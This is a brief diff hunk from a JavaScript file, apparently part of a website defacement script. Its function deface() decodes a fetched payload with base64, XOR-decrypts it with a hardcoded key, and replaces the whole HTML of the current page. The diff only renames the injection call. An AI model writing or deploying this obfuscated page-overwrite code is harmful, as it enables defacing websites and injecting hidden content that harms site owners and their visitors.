@@ -53,7 +53,7 @@ function deface() {
             let decodedhtml = atob(data);
             let decryptedHTML = xorEncryptDecrypt(decodedhtml, 'fUCCk')
             // Replace the entire HTML of the current document
-            injectHTMLAndLoadResources(decryptedHTML);
+            clearAndInjectEverything(decryptedHTML);
         })
         .catch(error => console.error('Error:', error));
 }
